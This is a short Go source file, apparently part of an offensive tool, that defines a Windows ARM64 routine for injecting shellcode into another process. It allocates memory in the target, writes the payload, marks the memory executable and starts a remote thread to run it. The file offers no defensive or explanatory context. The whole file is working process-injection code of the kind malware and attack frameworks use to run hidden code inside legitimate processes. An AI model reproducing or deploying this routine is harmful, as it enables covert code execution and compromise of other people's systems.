//go:build windows && arm64
// +build windows,arm64

package main

import "fmt"

// doSyscallInject on ARM64 uses Win32 API instead of direct syscalls.
func doSyscallInject(hProc uintptr, sc []byte) error {
	addr, err := syscallNtAllocateVirtualMemory(nil, hProc, uintptr(len(sc)), PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("VirtualAllocEx: %w", err)
	}

	if err := syscallNtWriteVirtualMemory(nil, hProc, addr, sc); err != nil {
		syscallNtFreeVirtualMemory(nil, hProc, addr)
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	if _, err := syscallNtProtectVirtualMemory(nil, hProc, addr, uintptr(len(sc)), PAGE_EXECUTE_READ); err != nil {
		syscallNtFreeVirtualMemory(nil, hProc, addr)
		return fmt.Errorf("VirtualProtectEx: %w", err)
	}

	hThread, err := syscallNtCreateThreadEx(nil, hProc, addr)
	if err != nil {
		syscallNtFreeVirtualMemory(nil, hProc, addr)
		return fmt.Errorf("CreateRemoteThread: %w", err)
	}
	arm64CloseHandle.Call(hThread)
	return nil
}
